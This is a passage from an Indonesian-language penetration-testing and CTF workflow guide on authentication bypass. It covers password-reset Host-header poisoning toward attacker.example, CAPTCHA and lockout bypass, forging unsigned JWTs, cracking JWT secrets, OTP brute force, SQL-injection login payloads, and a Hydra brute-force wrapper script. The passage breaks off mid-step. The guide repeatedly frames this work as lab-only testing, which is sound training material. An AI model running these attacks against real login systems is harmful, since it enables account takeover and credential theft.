http://TARGET/forgot-password
```

Expected vulnerable behavior:

```text
Application
    │
    ▼
Generate reset URL
    │
    ▼
https://attacker.example/reset?token=...
```

Jika challenge menyediakan server attacker, jalankan:

```bash
python3 -m http.server 8000
```

Atau:

```bash
nc -lvnp 8000
```

Untuk HTTP request logging sederhana:

```bash
python3 -m http.server 8000 --bind 0.0.0.0
```

---

## Analisis

```text
Host controlled by attacker
          │
          ▼
Password reset generated
          │
          ▼
Reset link uses malicious host
          │
          ▼
Victim receives poisoned link
```

Ini membutuhkan kondisi server tertentu; `Host` header testing bukan otomatis berarti exploit berhasil.

---

# 5.3 Token Reuse

## 📌 Kapan Digunakan

Saat ingin mengetahui apakah reset token benar-benar single-use.

Workflow:

```text
Request reset
    │
    ▼
Token A
    │
    ▼
Use token A
    │
    ▼
Change password
    │
    ▼
Reuse token A
```

Expected secure:

```text
Token expired / invalid
```

Potentially vulnerable:

```text
Token accepted again
```

---

## Token Valid untuk User Lain

Pada lab yang memang memberikan multi-account:

```text
Account A reset
       │
       ▼
Token A
       │
       ▼
Attempt against Account B
```

Jika token tidak terikat dengan identitas/account yang benar, itu indikasi kelemahan desain.

---

# 5.4 Username/Email Enumeration via Reset

Bandingkan:

```bash
curl -i -X POST http://TARGET/forgot-password \
-d 'email=known@example.com'
```

vs

```bash
curl -i -X POST http://TARGET/forgot-password \
-d 'email=random123@example.com'
```

Perhatikan:

```text
status code
response length
message
redirect
response time
```

Contoh:

```text
Known:
"Reset email has been sent."

Unknown:
"No account exists."
```

---

# 🤖 6. CAPTCHA Bypass

---

# 6.1 Common CAPTCHA Bypass Methods

## 📌 Kapan Digunakan

Saat CAPTCHA dimaksudkan untuk membatasi login/request otomatis, tetapi implementasinya hanya di frontend atau tidak divalidasi server-side.

---

## 1. Reuse CAPTCHA Token

Normal:

```text
GET /captcha
      │
      ▼
token = ABC123
```

Gunakan token:

```bash
curl -X POST http://TARGET/login \
-d 'username=admin' \
-d 'password=test' \
-d 'captcha=ABC123'
```

Coba kembali token yang sama:

```bash
curl -X POST http://TARGET/login \
-d 'username=admin' \
-d 'password=test2' \
-d 'captcha=ABC123'
```

Expected secure:

```text
CAPTCHA expired
```

Potential vulnerable:

```text
CAPTCHA accepted again
```

---

## 2. Null / Empty CAPTCHA

```bash
curl -X POST http://TARGET/login \
-d 'username=admin' \
-d 'password=test' \
-d 'captcha='
```

Test juga missing:

```bash
curl -X POST http://TARGET/login \
-d 'username=admin' \
-d 'password=test'
```

---

## 3. Remove CAPTCHA Parameter

Burp:

```text
Original:
username=admin
password=test
captcha=ABC123
```

Modified:

```text
username=admin
password=test
```

Jika server masih memproses authentication tanpa CAPTCHA, indikasi validasi hanya di frontend atau endpoint memiliki flaw.

---

## 4. Old API Endpoint

Cari:

```text
/login
/api/login
/api/v1/login
/api/v2/login
/legacy/login
```

Bandingkan:

```http
POST /login
POST /api/login
```

Jika endpoint lama tidak memvalidasi CAPTCHA, itu kandidat bypass.

---

## 5. OCR

Install:

```bash
sudo apt install tesseract-ocr
```

Jika challenge CAPTCHA berupa image:

```bash
tesseract captcha.png stdout
```

Expected:

```text
A7K9P
```

OCR tidak selalu berhasil terutama untuk CAPTCHA yang memang dirancang mengalahkan OCR.

---

# 🚪 7. Account Lockout Bypass

> Fokus di sini adalah memahami desain lockout pada lab/CTF, bukan menyerang akun nyata.

---

# 7.1 IP Rotation Bypass

## 📌 Kapan Digunakan

Saat aplikasi mengunci berdasarkan IP address.

Cari indikator:

```text
Too many attempts
IP blocked
Try again later
```

Secara konseptual:

```text
Attempt 1
Attempt 2
Attempt 3
     │
     ▼
IP locked
```

Tes header trust pada lab:

```bash
curl -i -X POST http://TARGET/login \
-H 'X-Forwarded-For: 10.0.0.10' \
-d 'username=admin&password=x'
```

Variasi:

```bash
curl -i -X POST http://TARGET/login \
-H 'X-Forwarded-For: 10.0.0.11' \
-d 'username=admin&password=x'
```

Header alternatif yang kadang ditemukan di implementasi proxy:

```text
X-Real-IP
Forwarded
Client-IP
```

> Header ini **tidak otomatis mengubah source IP**. Teknik hanya relevan bila aplikasi/proxy salah mempercayai header tersebut.

---

## ffuf dengan Header Manipulation

Pada lab:

```bash
ffuf \
-u http://TARGET/login \
-X POST \
-d 'username=admin&password=FUZZ' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'X-Forwarded-For: 10.0.0.FUZZ' \
-w numbers.txt
```

Buat `numbers.txt`:

```bash
seq 1 254 > numbers.txt
```

---

# 7.2 Username Cycling

## 📌 Kapan Digunakan

Ketika lockout diterapkan per-username.

Contoh:

```text
admin locked
```

Tetapi account lain belum locked.

Konsep:

```text
admin       → locked
administrator → active
support      → active
test        → active
```

Gunakan username enumeration terlebih dahulu.

---

# 7.3 Null Byte & Case Manipulation

## 📌 Kapan Digunakan

Saat aplikasi memiliki parser/normalization flaw.

Test pada lab:

```text
admin\x00
```

HTTP/curl URL-encoded:

```bash
curl -i -X POST http://TARGET/login \
--data-urlencode 'username=admin%00' \
--data-urlencode 'password=test'
```

Case variants:

```text
admin
Admin
ADMIN
aDmIn
```

Command:

```bash
curl -i -X POST http://TARGET/login \
-d 'username=ADMIN' \
-d 'password=test'
```

Perhatikan apakah:

```text
authentication layer
database lookup
lockout tracking
```

menggunakan normalisasi yang konsisten.

---

# 🎫 8. JWT Authentication Bypass

> **Quick overview:** JWT penuh dibahas pada workflow JWT khusus.

---

# 8.1 JWT Structure

JWT:

```text
HEADER.PAYLOAD.SIGNATURE
```

Contoh:

```text
eyJhbGciOiJIUzI1NiJ9
.
eyJzdWIiOiJhZG1pbiJ9
.
abc123
```

---

## Decode Header

```bash
echo 'eyJhbGciOiJIUzI1NiJ9' | base64 -d
```

Jika padding bermasalah:

```bash
python3 - <<'PY'
import base64

s = "eyJhbGciOiJIUzI1NiJ9"
s += "=" * (-len(s) % 4)

print(base64.urlsafe_b64decode(s).decode())
PY
```

---

## Decode JWT dengan Python

```bash
python3 - <<'PY'
import base64
import json
import sys

token = sys.argv[1] if len(sys.argv) > 1 else ""

parts = token.split(".")

if len(parts) != 3:
    raise SystemExit("Usage: python3 decode.py <JWT>")

for name, part in zip(("HEADER", "PAYLOAD"), parts[:2]):
    part += "=" * (-len(part) % 4)
    data = base64.urlsafe_b64decode(part)
    print(f"\n{name}:")
    print(json.dumps(json.loads(data), indent=2))
PY
```

---

## jwt.io

Decode token secara offline/visual dengan JWT tooling yang tersedia pada environment/lab.

Yang dicari:

```json
{
  "alg": "HS256"
}
```

atau:

```json
{
  "alg": "RS256"
}
```

Payload:

```json
{
  "sub": "admin",
  "role": "user"
}
```

---

# 8.2 None Algorithm Attack

## 📌 Kapan Digunakan

Hanya ketika implementasi JWT secara salah menerima:

```json
{
  "alg": "none"
}
```

dan tidak memverifikasi signature sebagaimana mestinya.

---

## Python — Craft JWT `none`

> **⚠️ Catatan Versi PyJWT >= 2.0:**
> Library `PyJWT` versi 2.0 ke atas secara default **menolak** `algorithm="none"` dan akan menampilkan error.
> Gunakan script Python murni (pure Python tanpa dependensi eksternal) berikut yang 100% andal di seluruh versi Python dan Parrot OS modern:

```bash
python3 - <<'PY'
import base64
import json

def b64url(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin"}

h = b64url(json.dumps(header, separators=(',', ':')))
p = b64url(json.dumps(payload, separators=(',', ':')))

# Token dengan empty signature (none algorithm: header.payload.)
token = f"{h}.{p}."
print("[+] Token dengan trailing dot:")
print(token)

# Variasi: beberapa implementasi server menerima tanpa dot terakhir
print(f"\n[+] Token tanpa trailing dot:\n{h}.{p}")
PY
```

---

## Curl Test

```bash
TOKEN="PASTE_TOKEN_HERE"

curl -i \
-H "Authorization: Bearer $TOKEN" \
http://TARGET/admin
```

Cookie:

```bash
curl -i \
-H "Cookie: token=$TOKEN" \
http://TARGET/admin
```

Expected secure:

```text
401 Unauthorized
```

Potential vulnerable:

```text
200 OK
admin dashboard
```

---

# 8.3 Weak Secret Brute Force

## 📌 Kapan Digunakan

Ketika JWT menggunakan HMAC:

```text
HS256
HS384
HS512
```

dan secret diduga lemah.

---

## Hashcat JWT

Mode umum:

```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

Format:

```text
HEADER.PAYLOAD.SIGNATURE
```

`jwt.txt`:

```text
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.signature
```

---

## John the Ripper

Tergantung build/plugin yang tersedia.

Cek:

```bash
john --list=formats | grep -i jwt
```

Jika JWT format tersedia:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt
```

---

# 8.4 Algorithm Confusion — RS256 → HS256

## 📌 Kapan Digunakan

Saat aplikasi seharusnya menggunakan:

```text
RS256
```

tetapi server secara keliru menerima:

```text
HS256
```

dengan material public key sebagai secret.

Konsep:

```text
Expected:
RS256
Private Key → Sign
Public Key  → Verify

Broken:
HS256 accepted
Public Key used as HMAC secret
```

---

## jwt_tool

Cek:

```bash
jwt_tool --help
```

Decode:

```bash
jwt_tool "$TOKEN"
```

Test tampering capabilities:

```bash
jwt_tool "$TOKEN" -T
```

Algorithm confusion workflows bergantung pada versi jwt_tool dan apakah public key tersedia.

Cari key:

```bash
curl -s http://TARGET/.well-known/jwks.json
```

atau:

```bash
curl -s http://TARGET/.well-known/openid-configuration
```

---

# 🔗 9. OAuth & SSO Bypass

> Detail penuh direncanakan pada **File 34**.

---

# 9.1 Common OAuth Misconfigurations

## Redirect URI Manipulation

### 📌 Kapan Digunakan

Ketika authorization request menggunakan:

```text
redirect_uri=
```

Normal:

```text
https://target.example/callback
```

Test pada lab:

```text
https://target.example/callback?x=1
https://target.example/callback/
```

dan variasi yang sesuai dengan parser target.

Contoh request inspection:

```bash
curl -I \
'https://TARGET/oauth/authorize?client_id=test&redirect_uri=https%3A%2F%2Ftarget.example%2Fcallback'
```

Potential issue:

```text
redirect URI diterima meskipun bukan URI yang seharusnya terdaftar
```

---

## Token Leakage via Referer

Periksa response:

```bash
curl -I 'https://TARGET/callback?code=TEST'
```

Perhatikan:

```text
Location
Referer-related behavior
third-party resources
```

Masalah dapat terjadi ketika token/authorization code tertinggal dalam URL dan kemudian terekspos melalui resource loading atau navigasi.

---

## State Parameter Missing

Normal:

```text
state=random_value
```

Jika request OAuth tidak memiliki `state`, itu dapat menjadi indikator risiko CSRF pada flow tertentu.

---

# 9.2 SSO Bypass Patterns

## SAML Injection

Cari:

```text
SAMLResponse
RelayState
Assertion
NameID
```

Inspect dengan Burp.

Fokus:

```text
signature verification
recipient validation
audience validation
assertion parsing
```

---

## OpenID Connect

Cari:

```text
/.well-known/openid-configuration
```

Example:

```bash
curl -s \
http://TARGET/.well-known/openid-configuration
```

Cari:

```text
issuer
jwks_uri
authorization_endpoint
token_endpoint
userinfo_endpoint
```

---

# 📱 10. MFA Bypass

---

# 10.1 OTP Bypass Techniques

## Reuse OTP

### 📌 Kapan Digunakan

Saat ingin mengetahui apakah OTP benar-benar:

```text
single-use
time limited
bound to transaction
```

Workflow:

```text
Request OTP
   │
   ▼
123456
   │
   ▼
Successful verification
   │
   ▼
Submit 123456 again
```

Expected:

```text
Invalid / expired OTP
```

---

## OTP via Response Manipulation

### 📌 Kapan Digunakan

Saat backend/frontend mengirim response seperti:

```json
{
  "success": false
}
```

atau:

```json
{
  "verified": false
}
```

Intercept dengan Burp.

Original:

```json
{
  "verified": false
}
```

Lab test:

```json
{
  "verified": true
}
```

Kemudian lanjutkan flow.

**Poin penting:** perubahan response hanya efektif apabila frontend mempercayai response tersebut dan backend tidak melakukan verifikasi ulang.

---

## Brute Force OTP 4 Digit

Kombinasi:

```text
10^4 = 10,000
```

Range:

```text
0000
0001
...
9999
```

---

## Brute Force OTP 6 Digit

```text
10^6 = 1,000,000
```

Jika rata-rata:

```text
10 requests/second
```

Worst case:

```text
1,000,000 / 10
= 100,000 seconds
≈ 27.8 hours
```

Jika:

```text
100 requests/second
```

maka:

```text
≈ 2.78 hours
```

Dengan rate limit:

```text
5 attempts
```

sebelum lockout, brute force menjadi tidak praktis.

---

## Null / Empty OTP

```bash
curl -i -X POST http://TARGET/verify-otp \
-d 'otp='
```

Missing parameter:

```bash
curl -i -X POST http://TARGET/verify-otp
```

Potential bug:

```text
otp field missing
        │
        ▼
backend defaults to true / skips check
```

---

## OTP in Response

Periksa:

```http
POST /send-otp
```

Response:

```json
{
  "status": "ok",
  "otp": "123456"
}
```

Jika OTP benar-benar dikembalikan oleh backend kepada client, itu merupakan developer/security mistake.

---

# 10.2 Backup Code Abuse

## 📌 Kapan Digunakan

Backup codes sering memiliki format tertentu:

```text
8 digit
10 digit
XXXXX-XXXXX
```

Analisis:

```text
length
charset
predictability
reuse
rate limit
```

Contoh:

```text
38291047
38291048
38291049
```

Sequential backup codes adalah indikator yang sangat buruk.

---

# 10.3 Response Manipulation

## Burp

Workflow:

```text
Request
  │
  ▼
Server
  │
  ▼
Response
  │
  ▼
Burp Intercept
  │
  ▼
Modify:
verified=false
       ↓
verified=true
  │
  ▼
Browser
```

Hal yang diuji:

```text
Apakah browser memutuskan sendiri?
Apakah backend tetap memverifikasi?
Apakah endpoint berikutnya menerima session?
```

---

## curl

curl tidak memiliki kemampuan native yang sama seperti browser interception.

Konsepnya:

```bash
curl -i -X POST http://TARGET/verify-otp \
-H 'Content-Type: application/json' \
-d '{"otp":"123456"}'
```

Kemudian response yang diterima dianalisis.

Untuk menguji apakah client-side trust menjadi masalah, periksa JavaScript frontend dan endpoint berikutnya.

---

# 🍪 11. Session Token Analysis

---

# 11.1 Weak Session ID

## 📌 Kapan Digunakan

Setelah login berhasil, capture cookie:

```text
PHPSESSID
JSESSIONID
session
sid
token
```

Command:

```bash
curl -i http://TARGET/login
```

Atau:

```bash
curl -i -c cookies.txt http://TARGET/login
```

---

## Analisis Entropy

Kumpulkan beberapa token:

```text
ABC123
ABC124
ABC125
```

Cari:

```text
length
charset
sequence
timestamp
increment
predictability
```

---

## Predictability Test

```text
Token 1:
100001

Token 2:
100002

Token 3:
100003
```

Ini jauh lebih mencurigakan daripada random cryptographic token.

---

# 11.2 Session Fixation

## 📌 Kapan Digunakan

Saat ingin menguji apakah session ID sebelum login tetap sama setelah authentication.

Workflow:

```text
GET /login
      │
      ▼
Session = ABC
      │
      ▼
Login
      │
      ▼
Session = ABC
```

Secure application biasanya melakukan rotation:

```text
Before:
ABC

After:
XYZ
```

---

## Test

Ambil cookie:

```bash
curl -i -c before.txt http://TARGET/login
```

Login dengan:

```bash
curl -i -b before.txt -c after.txt \
-X POST \
-d 'username=test&password=test' \
http://TARGET/login
```

Bandingkan:

```bash
cat before.txt
cat after.txt
```

---

# 11.3 Cookie Security Analysis

## 📌 Kapan Digunakan

Setelah berhasil login atau ketika endpoint mengeluarkan session cookie.

Command:

```bash
curl -I http://TARGET/login
```

Cari:

```text
Set-Cookie
```

Contoh:

```text
Set-Cookie: PHPSESSID=abc123;
Path=/;
HttpOnly;
Secure;
SameSite=Lax
```

---

## Cookie Flags

|Flag|Makna|
|---|---|
|`Secure`|Cookie dikirim melalui HTTPS|
|`HttpOnly`|JavaScript tidak dapat membaca cookie via `document.cookie`|
|`SameSite`|Mengurangi risiko cross-site cookie sending|

Tidak ada `HttpOnly`:

```text
JavaScript lebih mudah membaca cookie
```

Tidak ada `Secure`:

```text
Cookie berpotensi terkirim melalui HTTP
```

Tidak ada `SameSite`:

```text
Perlindungan terhadap sebagian cross-site request berkurang
```

Flag yang hilang adalah **indikasi kelemahan konfigurasi**, bukan otomatis session hijacking.

---

# ⚙️ 12. Automation Scripts

---

# 12.1 Script `auth_recon.sh`

### 📌 Kapan Digunakan

Saat sudah menemukan login page dan ingin pemeriksaan awal otomatis.

### Input

```text
URL login page
```

### Output

```text
Authentication indicators
Cookie/session indicators
Basic default checks
Next steps
```

```bash
#!/usr/bin/env bash

set -u

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

usage() {
    echo "Usage: $0 <login_url>"
    exit 1
}

[[ $# -eq 1 ]] || usage

URL="$1"

if [[ ! "$URL" =~ ^https?:// ]]; then
    echo -e "${RED}[!] URL must start with http:// or https://${NC}"
    exit 1
fi

if [[ "$URL" =~ [[:space:]] ]]; then
    echo -e "${RED}[!] URL contains whitespace${NC}"
    exit 1
fi

echo -e "${BLUE}[*] Target: $URL${NC}"

TMP="$(mktemp)"
trap 'rm -f "$TMP"' EXIT

curl -ksS -D "$TMP" "$URL" -o /tmp/auth_body.$$ || {
    echo -e "${RED}[!] Request failed${NC}"
    exit 1
}

BODY="$(cat /tmp/auth_body.$$)"
rm -f /tmp/auth_body.$$

echo
echo -e "${YELLOW}=== Authentication Indicators ===${NC}"

if grep -Eqi 'type=["'\'']password["'\'']|name=["'\'']password["'\'']' <<< "$BODY"; then
    echo -e "${GREEN}[+] Form-based authentication likely${NC}"
else
    echo "[-] Password form not detected"
fi

if grep -Eqi 'WWW-Authenticate:' "$TMP"; then
    echo -e "${GREEN}[+] HTTP authentication challenge detected${NC}"
fi

if grep -Eqi 'jwt|bearer|authorization' <<< "$BODY"; then
    echo -e "${GREEN}[+] Token/JWT indicators detected${NC}"
fi

if grep -Eqi 'otp|totp|2fa|two.factor|verification.code' <<< "$BODY"; then
    echo -e "${GREEN}[+] MFA/OTP indicators detected${NC}"
fi

echo
echo -e "${YELLOW}=== Cookies ===${NC}"
grep -Ei '^Set-Cookie:' "$TMP" || echo "No Set-Cookie header seen"

echo
echo -e "${YELLOW}=== Common Endpoints ===${NC}"

BASE="${URL%/*}"

for endpoint in \
    "/robots.txt" \
    "/sitemap.xml" \
    "/login" \
    "/admin" \
    "/register" \
    "/forgot-password"; do

    code="$(curl -ksS -o /dev/null -w '%{http_code}' "$BASE$endpoint")"
    printf "%-20s %s\n" "$endpoint" "$code"
done

echo
echo -e "${YELLOW}=== Next Steps ===${NC}"
echo "1. Identify exact login parameters with Burp"
echo "2. Compare valid/invalid username responses"
echo "3. Check default credentials"
echo "4. Check SQLi authentication behavior"
echo "5. Check rate limiting / lockout"
echo "6. Analyze reset flow"
echo "7. Inspect cookies and session rotation"
```

Jalankan:

```bash
chmod +x auth_recon.sh
./auth_recon.sh http://TARGET/login
```

---

# 12.2 Script `login_bruteforce.sh`

### 📌 Kapan Digunakan

Wrapper sederhana untuk Hydra setelah:

```text
endpoint
username
failure string
```

sudah diketahui.

```bash
#!/usr/bin/env bash

set -euo pipefail

usage() {
    echo "Usage:"
    echo "$0 <target> <username> <wordlist> <path>"
    echo
    echo "Example:"
    echo "$0 http://10.10.10.5 admin /usr/share/wordlists/rockyou.txt /login"
    exit 1
}

[[ $# -eq 4 ]] || usage

TARGET="$1"
USERNAME="$2"
WORDLIST="$3"
PATH_LOGIN="$4"

if [[ ! "$TARGET" =~ ^https?:// ]]; then
    echo "[!] Target must start with http:// or https://"
    exit 1
fi

if [[ ! "$USERNAME" =~ ^[A-Za-z0-9._-]+$ ]]; then
    echo "[!] Invalid username"
    exit 1
fi

if [[ ! -f "$WORDLIST" ]]; then
    echo "[!] Wordlist not found: $WORDLIST"
    exit 1
fi

if [[ "$PATH_LOGIN" != /* ]]; then
    echo "[!] Login path must begin with /"
    exit 1
fi

if ! command -v hydra >/dev/null 2>&1; then
    echo "[!] Hydra not installed"
    exit 1
fi

HOST="${TARGET#http://}"
HOST="${HOST#https://}"
HOST="${HOST%%/*}"

PROTO="http"
[[ "$TARGET" == https://* ]] && PROTO="https"

echo "[*] Target : $TARGET"
echo "[*] User   : $USERNAME"
echo "[*] Wordlist: $WORDLIST"
echo "[*] Path   : $PATH_LOGIN"

echo
echo "[*] Starting Hydra..."
echo

hydra \
    -l "$USERNAME" \
    -P "$WORDLIST" \
    "$HOST" \
    "http-post-form" \
    "${PATH_LOGIN}:username=^USER^&password=^PASS^:F=Invalid credentials" \
    -f \
    -t 4 \
    -w 5 \
    -v

echo
echo "[*] Finished."
```

> Sesuaikan `username=`, `password=`, dan failure condition berdasarkan request aktual dari Burp. Jangan mengasumsikan semua form memakai parameter tersebut.

---

# 12.3 One-Liners Collection

## Quick JWT Decode

```bash
python3 -c 'import base64,json,sys; t=sys.argv[1].split("."); [print(json.dumps(json.loads(base64.urlsafe_b64decode(x+"="*(-len(x)%4))),indent=2)) for x in t[:2]]' "$TOKEN"
```

---

## Quick SQLi Login Test

```bash
curl -i -X POST http://TARGET/login \
--data-urlencode "username=admin'--" \
--data-urlencode "password=test"
```

---

## Quick Default Credentials Check

```bash
for p in admin password password123 admin123 root toor; do echo "[*] $p"; curl -ks -X POST http://TARGET/login -d "username=admin&password=$p" | grep -Ei 'dashboard|logout|welcome' && echo "[+] Possible hit: $p"; done
```

---

# 🌳 13. Decision Tree

## Standalone Authentication Decision Tree

```text
TRIGGER:
Login page ditemukan
          │
          ▼
┌─────────────────────────┐
│ Identify Authentication │
│ Mechanism               │
└────────────┬────────────┘
             │
    ┌────────┼─────────┬──────────────┐
    ▼        ▼         ▼              ▼
  Form    Basic Auth   JWT         OAuth/SSO
    │        │         │              │
    ▼        ▼         ▼              ▼
 [FORM]   [BASIC]    [JWT]          [SSO]
    │
    ▼
Enumerate Username
    │
    ├── Error difference
    │       │
    │       └── found username
    │
    ├── Timing difference
    │
    └── Registration/Reset/API
            │
            ▼
       Username Candidate
            │
            ▼
   Try Default Credentials
            │
       ┌────┴────┐
       │         │
     Success    Fail
       │         │
       ▼         ▼
    ACCESS    SQLi Bypass
                  │
             ┌────┴────┐
             │         │
           Success    Fail
             │         │
             ▼         ▼
          ACCESS    Brute Force
                        │
                 ┌──────┴──────┐
                 │             │
               Success       Lockout
                 │             │
                 ▼             ▼
              ACCESS      Lockout Analysis
                               │
                         ┌─────┴─────┐
                         │           │
                     IP-based    User-based
                         │           │
                         └─────┬─────┘
                               │
                               ▼
                         Password Reset
                               │
                               ├── predictable token
                               ├── token reuse
                               ├── host poisoning
                               └── enumeration
```

---

## Form Login Path

```text
Login Page
    │
    ▼
Form-Based?
    │
    ▼
Inspect Request
    │
    ├── username
    ├── password
    ├── CSRF token
    └── failure response
            │
            ▼
Username Enumeration
            │
            ▼
Default Credentials
            │
            ▼
SQLi Authentication Bypass
            │
            ▼
Rate Limit?
       ┌────┴────┐
      NO         YES
       │          │
       ▼          ▼
   Brute Force  Lockout
                  │
                  ▼
             Reset Flow
```

---

## Basic Auth Path

```text
401
 │
 ▼
WWW-Authenticate: Basic
 │
 ▼
Identify protected resource
 │
 ▼
Default credentials
 │
 ▼
Credential testing
 │
 ▼
ACCESS / FAIL
```

---

## JWT Path

```text
JWT Found
   │
   ▼
Decode Header
   │
   ├── alg=none?
   │      └── test implementation flaw
   │
   ├── HS256?
   │      └── weak secret test
   │
   └── RS256?
          │
          ▼
     Key / JWKS analysis
          │
          ▼
      Algorithm confusion review
```

---

## Password Reset Path

```text
Forgot Password
      │
      ▼
Capture reset request
      │
      ▼
Compare user A / user B
      │
      ├── response difference
      │       └── enumeration
      │
      ├── predictable token
      │
      ├── token reusable
      │
      └── host controlled URL
              │
              ▼
        Reset workflow analysis
```

---

# 🛠️ 14. Common Errors & Troubleshooting

|Error|Sebab|Solusi|
|---|---|---|
|Hydra tidak menemukan password|Failure string salah|Ambil response asli dengan Burp lalu cari teks failure yang benar|
|Hydra mendeteksi hampir semua password valid|Failure condition terlalu lemah|Bandingkan status/size/body normal vs failed|
|Hydra langsung selesai|Endpoint/protocol salah|Verifikasi request manual dengan Burp/curl|
|HTTP 200 untuk semua login|Aplikasi menggunakan response body sebagai indikator|Filter berdasarkan words/lines/size|
|Rate limiting memblok brute force|Login memiliki request throttling|Uji limit pada lab dan analisis lockout design|
|CSRF token invalid|Token berubah setiap request|Ambil token per request; tool sederhana mungkin tidak cocok|
|Lockout setelah N percobaan|Account lockout aktif|Tentukan apakah lockout berdasarkan user, IP, atau kombinasi|
|Username tidak dapat dienumerasi|Generic error response|Gunakan timing/registration/reset/API clues|
|SQLi payload tidak bekerja|Query/context berbeda|Coba variasi quote/comment dan identifikasi DB/context|
|SQL syntax error|Payload tidak cocok dengan SQL dialect|Jangan asal menambah payload; identifikasi DB dan query context|
|JWT signature error|Signature tidak valid|Pastikan alg/key/token format benar|
|JWT `none` ditolak|Library/implementation aman|Lanjut analisis secret, claims, key handling, atau auth logic|
|Hashcat JWT tidak menemukan secret|Secret kuat / wrong token|Pastikan mode `16500`, token valid, wordlist sesuai|
|OTP brute force tidak efektif|Rate limit / lockout|Hitung search space dan identifikasi throttling|
|CAPTCHA bypass gagal|CAPTCHA divalidasi server-side|Inspect request/response dan lifecycle token|
|Reset token langsung invalid|Token expired atau one-time|Periksa lifetime dan lakukan pengujian dengan token baru|
|Host header tidak mempengaruhi link|App memakai canonical hostname|Inspect reverse proxy/application configuration|
|Cookie tidak berubah setelah login|Bisa session fixation atau desain tertentu|Bandingkan pre-login dan post-login session secara hati-hati|
|Cookie tidak memiliki `Secure`|Konfigurasi cookie lemah|Catat sebagai finding dan uji apakah aplikasi juga melayani HTTP|
|Cookie tidak memiliki `HttpOnly`|JavaScript dapat mengakses cookie|Catat sebagai konfigurasi lemah; validasi dampak|
|ffuf semua hasil terlihat valid|Baseline response tidak difilter|Ambil response login gagal lalu gunakan `-fs`, `-fw`, atau status filter|
|`curl` tidak mengikuti redirect|Default curl tidak selalu mengikuti redirect|Tambahkan `-L` ketika memang diperlukan|

---

# 🧠 Authentication Bypass Mindset

Jangan berpikir:

```text
"Apa payload paling sakti?"
```

Gunakan:

```text
Apa yang sebenarnya diverifikasi?
          │
          ▼
Apa yang dianggap sebagai identity?
          │
          ▼
Di mana state authentication disimpan?
          │
          ▼
Apa yang membuat login dianggap sukses?
          │
          ▼
Apakah validasi terjadi di client atau server?
          │
          ▼
Apakah token/session dapat diprediksi?
          │
          ▼
Apakah recovery flow lebih lemah daripada login?
```

---

# ✅ Final Checklist

```text
[ ] Login endpoint ditemukan
[ ] Authentication mechanism identified
[ ] Request ditangkap dengan Burp
[ ] Username enumeration diuji
[ ] Default credentials diuji
[ ] Failure response dipahami
[ ] SQLi authentication bypass diuji
[ ] Rate limiting diperiksa
[ ] Account lockout diperiksa
[ ] Password reset flow diperiksa
[ ] Reset token dianalisis
[ ] CAPTCHA lifecycle dianalisis
[ ] JWT structure dianalisis
[ ] Session token dianalisis
[ ] Cookie flags diperiksa
[ ] MFA/OTP flow dianalisis
[ ] OAuth/SSO indicators diperiksa
[ ] Finding divalidasi dengan evidence
[ ] Access berhasil dibuktikan secara aman
```

---

# 🎯 Muscle Memory Sequence

Setiap menemukan login page, biasakan menjalankan urutan:

```text
1. Find Login
      ↓
2. Identify Mechanism
      ↓
3. Capture Request
      ↓
4. Understand Success / Failure
      ↓
5. Enumerate Username
      ↓
6. Try Default Credentials
      ↓
7. Test Authentication SQLi
      ↓
8. Check Rate Limit / Lockout
      ↓
9. Analyze Password Reset
      ↓
10. Analyze CAPTCHA / MFA
      ↓
11. Analyze Session / JWT
      ↓
12. Follow Access Result
```

---

# 18 — Authentication Bypass Complete Workflow — Interactive Decision Guide

> **Cara baca:** Setiap langkah punya ✅ OUTPUT BERHASIL dan ❌ OUTPUT GAGAL. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
export TARGET="http://10.10.11.200"
export LHOST="10.10.14.5"
export LPORT="4444"
mkdir -p ~/auth_loot/{recon,creds,tokens,burp}
cd ~/auth_loot

echo "[*] Target: $TARGET"
```

---

## ═══════════════════════════════════════

## FASE 0: TEMUKAN LOGIN PAGE

## ═══════════════════════════════════════

### Langkah 0.1 — Discovery Login Endpoint

Bash

```
# Command 1: Cek robots.txt dan sitemap dulu (GRATIS info)
curl -s "$TARGET/robots.txt" | grep -iE "login|admin|auth|portal|signin"
curl -s "$TARGET/sitemap.xml" | grep -iE "login|auth|admin|signin"

# Command 2: Cek source halaman utama
curl -s "$TARGET" | grep -iE "login|signin|auth|password|username" | head -20

# Command 3: ffuf discovery login endpoints
ffuf -u "$TARGET/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/common.txt \
    -mc 200,301,302,307,401,403 \
    -fc 404 \
    -e .php,.html,.jsp,.asp,.aspx \
    -o ~/auth_loot/recon/ffuf_login.txt

# Command 4: gobuster alternatif
gobuster dir \
    -u "$TARGET" \
    -w /usr/share/seclists/Discovery/Web-Content/common.txt \
    -x php,html,jsp,asp,aspx \
    -s 200,301,302,401,403 \
    -o ~/auth_loot/recon/gobuster_login.txt
```

**OUTPUT BERHASIL ✅ — Login endpoint ditemukan:**

text

```
/login          [Status: 200, Size: 5312]
/admin          [Status: 302, Size: 112]
/signin         [Status: 200, Size: 4891]
/user/login     [Status: 200, Size: 3201]
```

➡️ Catat semua endpoint. Prioritas:

Bash

```
export LOGIN_URL="$TARGET/login"
echo "$LOGIN_URL" >> ~/auth_loot/recon/login_endpoints.txt
```

**OUTPUT GAGAL ❌ — Tidak ada endpoint relevan:**

text

```
(tidak ada hasil, atau semua 404)
```

➡️ Coba path yang lebih spesifik:

Bash

```
# Wordlist lebih besar
ffuf -u "$TARGET/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/big.txt \
    -mc 200,301,302,401

# Atau cek apakah ada subdomain/vhost
ffuf -u "http://FUZZ.$(echo $TARGET | cut -d/ -f3)" \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -mc 200,301,302
```

---

### Langkah 0.2 — Identifikasi Authentication Mechanism

Bash

```
# Inspect form structure
